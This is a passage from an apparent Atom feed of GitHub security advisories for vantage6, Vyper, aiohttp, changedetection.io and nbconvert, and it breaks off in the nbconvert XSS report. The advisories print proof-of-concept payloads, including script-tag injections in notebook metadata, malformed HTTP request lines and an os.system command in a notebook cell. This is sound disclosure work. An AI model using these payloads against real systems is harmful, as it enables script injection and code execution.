        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Nodes and servers get a ssh config by default that permits root login with password authentication. In a proper deployment, the SSH service is not exposed so there is no risk, but not all deployments are ideal. The default should therefore be less permissive.</p>
<p>We will probably opt to completely remove the ssh option as it is only used for debugging. Later, we can add a debug mode where we can activate it if necessary.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Remove the ssh part from the docker file and build your own docker image</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vantage6/vantage6/security/advisories/GHSA-2wgc-48g2-cj5w">https://github.com/vantage6/vantage6/security/advisories/GHSA-2wgc-48g2-cj5w</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-21653">https://nvd.nist.gov/vuln/detail/CVE-2024-21653</a></li>
<li><a href="https://github.com/vantage6/vantage6/commit/3fcc6e6a8bd1142fd7a558d8fdd2b246e55c8841">https://github.com/vantage6/vantage6/commit/3fcc6e6a8bd1142fd7a558d8fdd2b246e55c8841</a></li>
<li><a href="https://github.com/advisories/GHSA-2wgc-48g2-cj5w">https://github.com/advisories/GHSA-2wgc-48g2-cj5w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2wgc-48g2-cj5w</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-01-30T20:56:46.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vantage6-server] vantage6 vulnerable to username timing attack]]></title>
        <id>https://github.com/advisories/GHSA-45gq-q4xh-cp53</id>
        <link href="https://github.com/advisories/GHSA-45gq-q4xh-cp53"/>
        <updated>2024-01-30T20:56:50.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>It is possible to find out usernames from the response time of login requests. This could aid attackers in credential attacks</p>
<h3 id="workarounds">Workarounds</h3>
<p>No</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vantage6/vantage6/security/advisories/GHSA-45gq-q4xh-cp53">https://github.com/vantage6/vantage6/security/advisories/GHSA-45gq-q4xh-cp53</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-21671">https://nvd.nist.gov/vuln/detail/CVE-2024-21671</a></li>
<li><a href="https://github.com/vantage6/vantage6/commit/389f416c445da4f2438c72f34c3b1084485c4e30">https://github.com/vantage6/vantage6/commit/389f416c445da4f2438c72f34c3b1084485c4e30</a></li>
<li><a href="https://github.com/advisories/GHSA-45gq-q4xh-cp53">https://github.com/advisories/GHSA-45gq-q4xh-cp53</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-45gq-q4xh-cp53</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-01-30T20:56:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vantage6] vantage6 remote code execution vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-w9h2-px87-74vx</id>
        <link href="https://github.com/advisories/GHSA-w9h2-px87-74vx"/>
        <updated>2024-01-30T20:56:49.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Authenticated users could inject code into algorithm environment variables</p>
<h3 id="workarounds">Workarounds</h3>
<p>No </p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vantage6/vantage6/security/advisories/GHSA-w9h2-px87-74vx">https://github.com/vantage6/vantage6/security/advisories/GHSA-w9h2-px87-74vx</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-21649">https://nvd.nist.gov/vuln/detail/CVE-2024-21649</a></li>
<li><a href="https://github.com/vantage6/vantage6/commit/eac19db737145d3ca987adf037a454fae0790ddd">https://github.com/vantage6/vantage6/commit/eac19db737145d3ca987adf037a454fae0790ddd</a></li>
<li><a href="https://github.com/advisories/GHSA-w9h2-px87-74vx">https://github.com/advisories/GHSA-w9h2-px87-74vx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w9h2-px87-74vx</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-01-30T20:56:45.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vyper] Vyper's raw_call `value=` kwargs not disabled for static and delegate calls]]></title>
        <id>https://github.com/advisories/GHSA-x2c2-q32w-4w6m</id>
        <link href="https://github.com/advisories/GHSA-x2c2-q32w-4w6m"/>
        <updated>2024-01-30T21:34:13.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Vyper compiler allows passing a value in builtin <code>raw_call</code> even if the call is a <code>delegatecall</code> or a <code>staticcall</code>. But in the context of <code>delegatecall</code> and <code>staticcall</code> the handling of value is not possible due to the semantics of the respective opcodes, and vyper will silently ignore the <code>value=</code> argument.</p>
<p>A contract search was performed and no vulnerable contracts were found in production.</p>
<h3 id="details">Details</h3>
<p>The IR for <code>raw_call</code> is built in the <code>RawCall</code> class:
<a href="https://github.com/vyperlang/vyper/blob/9136169468f317a53b4e7448389aa315f90b95ba/vyper/builtins/functions.py#L1100">https://github.com/vyperlang/vyper/blob/9136169468f317a53b4e7448389aa315f90b95ba/vyper/builtins/functions.py#L1100</a></p>
<p>However, the compiler doesn't validate that if either <code>delegatecall</code> or <code>staticall</code> are provided as kwargs, that <code>value</code> wasn't set. For example, the following compiles without errors:</p>
<pre><code class="language-python">raw_call(self, call_data2, max_outsize=255, is_delegate_call=True, value=msg.value/2)
</code></pre>
<h3 id="impact">Impact</h3>
<p>If the semantics of the EVM are unknown to the developer, he could suspect that by specifying the <code>value</code> kwarg, exactly the given amount will be sent along to the target. However in fact, no <code>value</code> will be sent.</p>
<p>Here is an example of an potentially problematic implementation of multicall utilizing the <code>raw_call</code> built-in:</p>
<pre><code class="language-python">value_accumulator: uint256 = empty(uint256)
    results: DynArray[Result, max_value(uint8)] = []
    return_data: Bytes[max_value(uint8)] = b""
    success: bool = empty(bool)
    for batch in data:
        msg_value: uint256 = batch.value
        value_accumulator = unsafe_add(value_accumulator, msg_value)
        if (batch.allow_failure == False):
            return_data = raw_call(self, batch.call_data, max_outsize=255, value=msg_value, is_delegate_call=True)
            success = True
            results.append(Result({success: success, return_data: return_data}))
        else:
            success, return_data = \
                raw_call(self, batch.call_data, max_outsize=255, value=msg_value, is_delegate_call=True, revert_on_failure=False)
            results.append(Result({success: success, return_data: return_data}))
    assert msg.value == value_accumulator, "Multicall: value mismatch"
    return results
</code></pre>
<h3 id="patches">Patches</h3>
<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>
<h3 id="workarounds">Workarounds</h3>
<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>
<h3 id="references">References</h3>
<p><em>Are there any links users can visit to find out more?</em></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/vyperlang/vyper/security/advisories/GHSA-x2c2-q32w-4w6m">https://github.com/vyperlang/vyper/security/advisories/GHSA-x2c2-q32w-4w6m</a></li>
<li><a href="https://github.com/vyperlang/vyper/blob/9136169468f317a53b4e7448389aa315f90b95ba/vyper/builtins/functions.py#L1100">https://github.com/vyperlang/vyper/blob/9136169468f317a53b4e7448389aa315f90b95ba/vyper/builtins/functions.py#L1100</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-24567">https://nvd.nist.gov/vuln/detail/CVE-2024-24567</a></li>
<li><a href="https://github.com/advisories/GHSA-x2c2-q32w-4w6m">https://github.com/advisories/GHSA-x2c2-q32w-4w6m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x2c2-q32w-4w6m</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-01-30T18:42:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[aiohttp] aiohttp is vulnerable to directory traversal]]></title>
        <id>https://github.com/advisories/GHSA-5h86-8mv2-jq9f</id>
        <link href="https://github.com/advisories/GHSA-5h86-8mv2-jq9f"/>
        <updated>2024-01-30T16:12:22.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Improperly configuring static resource resolution in aiohttp when used as a web server can result in the unauthorized reading of arbitrary files on the system.</p>
<h3 id="details">Details</h3>
<p>When using aiohttp as a web server and configuring static routes, it is necessary to specify the root path for static files. Additionally, the option 'follow_symlinks' can be used to determine whether to follow symbolic links outside the static root directory. When 'follow_symlinks' is set to True, there is no validation to check if a given file path is within the root directory.This can lead to directory traversal vulnerabilities, resulting in unauthorized access to arbitrary files on the system, even when symlinks are not present.</p>
<p>i.e. An application is only vulnerable with setup code like:</p>
<pre><code>app.router.add_routes([
    web.static("/static", "static/", follow_symlinks=True),  # Remove follow_symlinks to avoid the vulnerability
])
</code></pre>
<h3 id="impact">Impact</h3>
<p>This is a directory traversal vulnerability with CWE ID 22. When using aiohttp as a web server and enabling static resource resolution with <code>follow_symlinks</code> set to True, it can lead to this vulnerability. This vulnerability has been present since the introduction of the <code>follow_symlinks</code> parameter.</p>
<h3 id="workaround">Workaround</h3>
<p>Even if upgrading to a patched version of aiohttp, we recommend following these steps regardless.</p>
<p>If using <code>follow_symlinks=True</code> outside of a restricted local development environment, disable the option immediately. This option is NOT needed to follow symlinks which point to a location <em>within</em> the static root directory, it is <em>only</em> intended to allow a symlink to break out of the static directory. Even with this CVE fixed, there is still a substantial risk of misconfiguration when using this option on a server that accepts requests from remote users.</p>
<p>Additionally, aiohttp has always recommended using a reverse proxy server (such as nginx) to handle static resources and <em>not</em> to use these static resources in aiohttp for production environments. Doing so also protects against this vulnerability, and is why we expect the number of affected users to be very low.</p>
<hr>
<p>Patch: <a href="https://github.com/aio-libs/aiohttp/pull/8079/files">https://github.com/aio-libs/aiohttp/pull/8079/files</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/aio-libs/aiohttp/security/advisories/GHSA-5h86-8mv2-jq9f">https://github.com/aio-libs/aiohttp/security/advisories/GHSA-5h86-8mv2-jq9f</a></li>
<li><a href="https://github.com/aio-libs/aiohttp/pull/8079/files">https://github.com/aio-libs/aiohttp/pull/8079/files</a></li>
<li><a href="https://github.com/aio-libs/aiohttp/commit/1c335944d6a8b1298baf179b7c0b3069f10c514b">https://github.com/aio-libs/aiohttp/commit/1c335944d6a8b1298baf179b7c0b3069f10c514b</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-23334">https://nvd.nist.gov/vuln/detail/CVE-2024-23334</a></li>
<li><a href="https://github.com/aio-libs/aiohttp/pull/8079">https://github.com/aio-libs/aiohttp/pull/8079</a></li>
<li><a href="https://github.com/advisories/GHSA-5h86-8mv2-jq9f">https://github.com/advisories/GHSA-5h86-8mv2-jq9f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5h86-8mv2-jq9f</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-01-29T22:31:03.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[aiohttp] aiohttp's HTTP parser (the python one, not llhttp) still overly lenient about separators]]></title>
        <id>https://github.com/advisories/GHSA-8qpw-xqxj-h4r2</id>
        <link href="https://github.com/advisories/GHSA-8qpw-xqxj-h4r2"/>
        <updated>2024-01-30T16:11:57.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Security-sensitive parts of the <em>Python HTTP parser</em> retained minor differences in allowable character sets, that must trigger error handling to robustly match frame boundaries of proxies in order to protect against injection of additional requests. Additionally, validation could trigger exceptions that were not handled consistently with processing of other malformed input.</p>
<h3 id="details">Details</h3>
<p>These problems are rooted in pattern matching protocol elements, previously improved by PR #3235 and GHSA-gfw2-4jvh-wgfg:</p>
<ol>
<li><p>The expression <code>HTTP/(\d).(\d)</code> lacked another backslash to clarify that the separator should be a literal dot, not just <em>any</em> Unicode code point (result: <code>HTTP/(\d)\.(\d)</code>).</p>
</li>
<li><p>The HTTP version was permitting Unicode digits, where only ASCII digits are standards-compliant.</p>
</li>
<li><p>Distinct regular expressions for validating HTTP Method and Header field names were used - though both should (at least) apply the common restrictions of rfc9110 <code>token</code>.</p>
</li>
</ol>
<h3 id="poc">PoC</h3>
<p><code>GET / HTTP/1ö1</code>
<code>GET / HTTP/1.𝟙</code>
<code>GET/: HTTP/1.1</code>
<code>Content-Encoding?: chunked</code></p>
<h3 id="impact">Impact</h3>
<p>Primarily concerns running an aiohttp server without llhttp:</p>
<ol>
<li><strong>behind a proxy</strong>: Being more lenient than internet standards require could, depending on deployment environment, assist in request smuggling.</li>
<li><strong>directly accessible</strong> or exposed behind proxies relaying malformed input: the unhandled exception could cause excessive resource consumption on the application server and/or its logging facilities.</li>
</ol>
<hr>
<p>Patch: <a href="https://github.com/aio-libs/aiohttp/pull/8074/files">https://github.com/aio-libs/aiohttp/pull/8074/files</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/aio-libs/aiohttp/security/advisories/GHSA-8qpw-xqxj-h4r2">https://github.com/aio-libs/aiohttp/security/advisories/GHSA-8qpw-xqxj-h4r2</a></li>
<li><a href="https://github.com/aio-libs/aiohttp/security/advisories/GHSA-gfw2-4jvh-wgfg">https://github.com/aio-libs/aiohttp/security/advisories/GHSA-gfw2-4jvh-wgfg</a></li>
<li><a href="https://github.com/aio-libs/aiohttp/pull/3235">https://github.com/aio-libs/aiohttp/pull/3235</a></li>
<li><a href="https://github.com/aio-libs/aiohttp/pull/8074/files">https://github.com/aio-libs/aiohttp/pull/8074/files</a></li>
<li><a href="https://github.com/aio-libs/aiohttp/commit/33ccdfb0a12690af5bb49bda2319ec0907fa7827">https://github.com/aio-libs/aiohttp/commit/33ccdfb0a12690af5bb49bda2319ec0907fa7827</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-23829">https://nvd.nist.gov/vuln/detail/CVE-2024-23829</a></li>
<li><a href="https://github.com/aio-libs/aiohttp/pull/8074">https://github.com/aio-libs/aiohttp/pull/8074</a></li>
<li><a href="https://github.com/advisories/GHSA-8qpw-xqxj-h4r2">https://github.com/advisories/GHSA-8qpw-xqxj-h4r2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8qpw-xqxj-h4r2</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-01-29T22:30:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[changedetection-io] changedetection.io API endpoint is not secured with API token]]></title>
        <id>https://github.com/advisories/GHSA-hcvp-2cc7-jrwr</id>
        <link href="https://github.com/advisories/GHSA-hcvp-2cc7-jrwr"/>
        <updated>2024-01-27T00:31:49.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>API endpoint <code>/api/v1/watch/&lt;uuid&gt;/history</code> can be accessed by any unauthorized user.</p>
<h3 id="details">Details</h3>
<p>WatchHistory resource does not have <code>@auth.check_token</code> annotation, which means it can be accessed without providing <code>x-api-key</code> header.</p>
<p><a href="https://github.com/dgtlmoon/changedetection.io/blob/9510345e01ea8e308c339163d8e8b030ce5ac7f1/changedetectionio/api/api_v1.py#L129-L156">https://github.com/dgtlmoon/changedetection.io/blob/9510345e01ea8e308c339163d8e8b030ce5ac7f1/changedetectionio/api/api_v1.py#L129-L156</a></p>
<h3 id="poc">PoC</h3>
<ol>
<li>Get list of watch with <code>x-api-key</code>:</li>
</ol>
<pre><code class="language-sh">$ curl -H "x-api-key: apikeyhere" http://localhost:5000/api/v1/watch
{"uuid": ...}
</code></pre>
<ol start="2">
<li>Call for history of snapshots without <code>x-api-key</code>. Expected - 401/403 error. Actual - list of snapshots is listed.</li>
</ol>
<pre><code class="language-sh">$ curl http://localhost:5000/api/v1/watch/uuid/history
{"timestamp": "/path/to/snapshot.txt"}
</code></pre>
<h3 id="impact">Impact</h3>
<p>Anybody can check one's watch history. However, because unauthorized party first needs to know watch UUID, and the watch history endpoint itself returns only paths to the snapshot on the server, an impact on users' data privacy is minimal.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/dgtlmoon/changedetection.io/security/advisories/GHSA-hcvp-2cc7-jrwr">https://github.com/dgtlmoon/changedetection.io/security/advisories/GHSA-hcvp-2cc7-jrwr</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-23329">https://nvd.nist.gov/vuln/detail/CVE-2024-23329</a></li>
<li><a href="https://github.com/dgtlmoon/changedetection.io/commit/402f1e47e78ecd155b1e90f30cce424ff7763e0f">https://github.com/dgtlmoon/changedetection.io/commit/402f1e47e78ecd155b1e90f30cce424ff7763e0f</a></li>
<li><a href="https://github.com/dgtlmoon/changedetection.io/blob/9510345e01ea8e308c339163d8e8b030ce5ac7f1/changedetectionio/api/api_v1.py#L129-L156">https://github.com/dgtlmoon/changedetection.io/blob/9510345e01ea8e308c339163d8e8b030ce5ac7f1/changedetectionio/api/api_v1.py#L129-L156</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/changedetection-io/PYSEC-2024-15.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/changedetection-io/PYSEC-2024-15.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-hcvp-2cc7-jrwr">https://github.com/advisories/GHSA-hcvp-2cc7-jrwr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hcvp-2cc7-jrwr</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-01-23T12:50:59.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nbconvert] nbconvert vulnerable to cross-site scripting (XSS) via multiple exploit paths]]></title>
        <id>https://github.com/advisories/GHSA-9jmq-rx5f-8jwq</id>
        <link href="https://github.com/advisories/GHSA-9jmq-rx5f-8jwq"/>
        <updated>2024-01-25T22:10:35.000Z</updated>
        <content type="html"><![CDATA[<p>Most of the fixes will be in this repo, though, so having it here gives us the private fork to work on patches</p>
<p>Below is currently a duplicate of the original report:</p>
<hr>
<p>Received on <a href="mailto:security@ipython.org">security@ipython.org</a> unedited, I'm not sure if we want to make it separate advisories. </p>
<p>Pasted raw for now, feel free to edit or make separate advisories if you have the rights to. </p>
<h2 id="i-think-the-most-important-is-to-switch-back-from-nbviewerjupyterorg---nbviewerorg-at-the-cloudflare-level-i-guess--there-might-be-fastly-involved-as-well">I think the most important is to switch back from nbviewer.jupyter.org -&gt; nbviewer.org at the cloudflare level I guess ? There might be fastly involved as well.</h2>
<h3 id="impact">Impact</h3>
<p><em>What kind of vulnerability is it? Who is impacted?</em></p>
<h3 id="patches">Patches</h3>
<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>
<h3 id="workarounds">Workarounds</h3>
<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>
<h3 id="references">References</h3>
<p><em>Are there any links users can visit to find out more?</em></p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Open an issue in <a href="http://example.com">example link to repo</a></li>
<li>Email us at <a href="mailto:example@example.com">example email address</a></li>
</ul>
<hr>
<h1 id="github-security-lab-ghsl-vulnerability-report">GitHub Security Lab (GHSL) Vulnerability Report</h1>
<p>The <a href="https://securitylab.github.com">GitHub Security Lab</a> team has identified potential security vulnerabilities in <a href="https://github.com/jupyter/nbconvert">nbconvert</a>.</p>
<p>We are committed to working with you to help resolve these issues. In this report you will find everything you need to effectively coordinate a resolution of these issues with the GHSL team.</p>
<p>If at any point you have concerns or questions about this process, please do not hesitate to reach out to us at <code>securitylab@github.com</code> (please include <code>GHSL-2021-1013</code>, <code>GHSL-2021-1014</code>, <code>GHSL-2021-1015</code>, <code>GHSL-2021-1016</code>, <code>GHSL-2021-1017</code>, <code>GHSL-2021-1018</code>, <code>GHSL-2021-1019</code>, <code>GHSL-2021-1020</code>, <code>GHSL-2021-1021</code>, <code>GHSL-2021-1022</code>, <code>GHSL-2021-1023</code>, <code>GHSL-2021-1024</code>, <code>GHSL-2021-1025</code>, <code>GHSL-2021-1026</code>, <code>GHSL-2021-1027</code> or <code>GHSL-2021-1028</code> as a reference).</p>
<p>If you are <em>NOT</em> the correct point of contact for this report, please let us know!</p>
<h2 id="summary">Summary</h2>
<p>When using nbconvert to generate an HTML version of a user-controllable notebook, it is possible to inject arbitrary HTML which may lead to Cross-Site Scripting (XSS) vulnerabilities if these HTML notebooks are served by a web server (eg: nbviewer) </p>
<h2 id="product">Product</h2>
<p>nbconvert</p>
<h2 id="tested-version">Tested Version</h2>
<p><a href="https://github.com/jupyter/nbconvert/releases/tag/5.5.0">v5.5.0</a></p>
<h2 id="details">Details</h2>
<h3 id="issue-1-xss-in-notebookmetadatalanguage_infopygments_lexer-ghsl-2021-1013">Issue 1: XSS in notebook.metadata.language_info.pygments_lexer (<code>GHSL-2021-1013</code>)</h3>
<p>Attacker in control of a notebook can inject arbitrary unescaped HTML in the <code>notebook.metadata.language_info.pygments_lexer</code> field such as the following:</p>
<pre><code class="language-json">"metadata": {
  "language_info": {
   "pygments_lexer": "ipython3-foo\"&gt;&lt;script&gt;alert(1)&lt;/script&gt;"
  }
}
</code></pre>
<p>This node is read in the <a href="https://github.com/jupyter/nbconvert/blob/3c0f82d1acbcf2264ae0fa892141a037563aabd0/nbconvert/exporters/html.py#L135-L140"><code>from_notebook_node</code></a> method:</p>
<pre><code class="language-python">def from_notebook_node(self, nb, resources=None, **kw):
  langinfo = nb.metadata.get('language_info', {})
  lexer = langinfo.get('pygments_lexer', langinfo.get('name', None))
  highlight_code = self.filters.get('highlight_code', Highlight2HTML(pygments_lexer=lexer, parent=self))
  self.register_filter('highlight_code', highlight_code)
  return super().from_notebook_node(nb, resources, **kw)
</code></pre>
<p>It is then assigned to <code>language</code> var and passed down to <a href="https://github.com/jupyter/nbconvert/blob/3c0f82d1acbcf2264ae0fa892141a037563aabd0/nbconvert/filters/highlight.py#L90"><code>_pygments_highlight</code></a></p>
<pre><code class="language-python">from pygments.formatters import LatexFormatter
if not language:
  language=self.pygments_lexer
latex = _pygments_highlight(source, LatexFormatter(), language, metadata)
</code></pre>
<p>In this method, the <code>language</code> variable is <a href="https://github.com/jupyter/nbconvert/blob/3c0f82d1acbcf2264ae0fa892141a037563aabd0/nbconvert/filters/highlight.py#L56">concatenated to <code>highlight hl-</code> string to conform the <code>cssclass</code></a> passed to the <code>HTMLFormatter</code> constructor:</p>
<pre><code class="language-python">return _pygments_highlight(source if len(source) &gt; 0 else ' ',
  # needed to help post processors:
  HtmlFormatter(cssclass=" highlight hl-"+language),
  language, metadata)
</code></pre>
<p>The <code>cssclass</code> variable is then <a href="https://github.com/pygments/pygments/blob/30cfa26201a27dee1f8e6b0d600cad1138e64507/pygments/formatters/html.py#L791">concatenated in the outer div class attribute</a></p>
<pre><code class="language-python">yield 0, ('&lt;div' + (self.cssclass and ' class="%s"' % self.cssclass) + (style and (' style="%s"' % style)) + '&gt;')
</code></pre>
<p>Note that the <code>cssclass</code> variable is also used in other unsafe places such as <a href="https://github.com/pygments/pygments/blob/30cfa26201a27dee1f8e6b0d600cad1138e64507/pygments/formatters/html.py#L711"><code>'&lt;table class="%stable"&gt;' % self.cssclass + filename_tr +</code></a>)</p>
<h3 id="issue-2-xss-in-notebookmetadatatitle-ghsl-2021-1014">Issue 2: XSS in notebook.metadata.title (<code>GHSL-2021-1014</code>)</h3>
<p>The <code>notebook.metadata.title</code> node is rendered directly to the <a href="https://github.com/jupyter/nbconvert/blob/3c0f82d1acbcf2264ae0fa892141a037563aabd0/share/jupyter/nbconvert/templates/lab/index.html.j2#L12-L13"><code>index.html.j2</code></a> HTML template with no escaping: </p>
<pre><code class="language-html">{% set nb_title = nb.metadata.get('title', '') or resources['metadata']['name'] %}
&lt;title&gt;{{nb_title}}&lt;/title&gt;
</code></pre>
<p>The following <code>notebook.metadata.title</code> node will execute arbitrary javascript:</p>
<pre><code class="language-json"> "metadata": {
  "title": "TITLE&lt;/title&gt;&lt;script&gt;alert(1)&lt;/script&gt;"
 }
</code></pre>
<p>Note: this issue also affect other templates, not just the <code>lab</code> one.</p>
<h3 id="issue-3-xss-in-notebookmetadatawidgetsghsl-2021-1015">Issue 3: XSS in notebook.metadata.widgets(<code>GHSL-2021-1015</code>)</h3>
<p>The <code>notebook.metadata.widgets</code> node is rendered directly to the <a href="https://github.com/jupyter/nbconvert/blob/3c0f82d1acbcf2264ae0fa892141a037563aabd0/share/jupyter/nbconvert/templates/lab/index.html.j2#L12-L13"><code>base.html.j2</code></a> HTML template with no escaping: </p>
<pre><code class="language-html">{% set mimetype = 'application/vnd.jupyter.widget-state+json'%}
{% if mimetype in nb.metadata.get("widgets",{})%}
&lt;script type="{{ mimetype }}"&gt;
{{ nb.metadata.widgets[mimetype] | json_dumps }}
&lt;/script&gt;
{% endif %}
</code></pre>
<p>The following <code>notebook.metadata.widgets</code> node will execute arbitrary javascript:</p>
<pre><code class="language-json"> "metadata": {
  "widgets": {
    "application/vnd.jupyter.widget-state+json": {"foo": "pwntester&lt;/script&gt;&lt;script&gt;alert(1);//"}
  }
 }
</code></pre>
<p>Note: this issue also affect other templates, not just the <code>lab</code> one.</p>
<h3 id="issue-4-xss-in-notebookcellmetadatatagsghsl-2021-1016">Issue 4: XSS in notebook.cell.metadata.tags(<code>GHSL-2021-1016</code>)</h3>
<p>The <code>notebook.cell.metadata.tags</code> nodes are output directly to the <a href="https://github.com/jupyter/nbconvert/blob/3c0f82d1acbcf2264ae0fa892141a037563aabd0/share/jupyter/nbconvert/templates/base/celltags.j2#L4"><code>celltags.j2</code></a> HTML template with no escaping: </p>
<pre><code>{%- macro celltags(cell) -%}
    {% if cell.metadata.tags | length &gt; 0 -%}
        {% for tag in cell.metadata.tags -%}
            {{ ' celltag_' ~ tag -}}
        {%- endfor -%}
    {%- endif %}
{%- endmacro %}
</code></pre>
<p>The following <code>notebook.cell.metadata.tags</code> node will execute arbitrary javascript:</p>
<pre><code class="language-json">  {
   "cell_type": "code",
   "execution_count": null,
   "id": "727d1a5f",
   "metadata": {
     "tags": ["FOO\"&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;div \""]
   },
   "outputs": [],
   "source": []
  }
 ],
</code></pre>
<p>Note: this issue also affect other templates, not just the <code>lab</code> one.</p>
<h3 id="issue-5-xss-in-output-data-texthtml-cellsghsl-2021-1017">Issue 5: XSS in output data text/html cells(<code>GHSL-2021-1017</code>)</h3>
<p>Using the <code>text/html</code> output data mime type allows arbitrary javascript to be executed when rendering an HTML notebook. This is probably by design, however, it would be nice to enable an option which uses an HTML sanitizer preprocessor to strip down all javascript elements:</p>
<p>The following is an example of a cell with <code>text/html</code> output executing arbitrary javascript code:</p>
<pre><code class="language-json">  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "b72e53fa",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
        "&lt;script&gt;alert(1)&lt;/script&gt;"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import os; os.system('touch /tmp/pwned')"
   ]
  },
</code></pre>
<h3 id="issue-6-xss-in-output-data-imagesvgxml-cellsghsl-2021-1018">Issue 6: XSS in output data image/svg+xml cells(<code>GHSL-2021-1018</code>)</h3>
<p>Using the <code>image/svg+xml</code> output data mime type allows arbitrary javascript to be executed when rendering an HTML notebook. </p>
<p>The <code>cell.output.data["image/svg+xml"]</code> nodes are rendered directly to the <a href="https://github.com/jupyter/nbconvert/blob/main/share/jupyter/nbconvert/templates/classic/base.html.j2"><code>base.html.j2</code></a> HTML template with no escaping</p>
<pre><code>{%- else %}
{{ output.data['image/svg+xml'] }}
{%- endif %}
</code></pre>
<p>The following <code>cell.output.data["image/svg+xml"]</code> node will execute arbitrary javascript:</p>
<pre><code class="language-json">    {
     "output_type": "execute_result",
     "data": {
      "image/svg+xml": ["&lt;script&gt;console.log(\"image/svg+xml output\")&lt;/script&gt;"]
     },
     "execution_count": null,
     "metadata": {
     }
    }
</code></pre>
<h3 id="issue-7-xss-in-notebookcelloutputsvg_filenameghsl-2021-1019">Issue 7: XSS in notebook.cell.output.svg_filename(<code>GHSL-2021-1019</code>)</h3>
<p>The <code>cell.output.svg_filename</code> nodes are rendered directly to the <a href="https://github.com/jupyter/nbconvert/blob/main/share/jupyter/nbconvert/templates/classic/base.html.j2"><code>base.html.j2</code></a> HTML template with no escaping</p>
<pre><code>{%- if output.svg_filename %}
&lt;img src="{{ output.svg_filename | posix_path }}"&gt;
</code></pre>
<p>The following <code>cell.output.svg_filename</code> node will escape the <code>img</code> tag context and execute arbitrary javascript:</p>
<pre><code class="language-json">  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b72e53fa",
   "metadata": {},
   "outputs": [
    {
     "output_type": "execute_result",
     "svg_filename": "\"&gt;&lt;script&gt;alert(1)&lt;/script&gt;",
     "data": {
      "image/svg+xml": [""]
     },
     "execution_count": null,
     "metadata": {
     }
    }
   ],
   "source": [""]
  },
</code></pre>
<h3 id="issue-8-xss-in-output-data-textmarkdown-cellsghsl-2021-1020">Issue 8: XSS in output data text/markdown cells(<code>GHSL-2021-1020</code>)</h3>
<p>Using the <code>text/markdown</code> output data mime type allows arbitrary javascript to be executed when rendering an HTML notebook. </p>
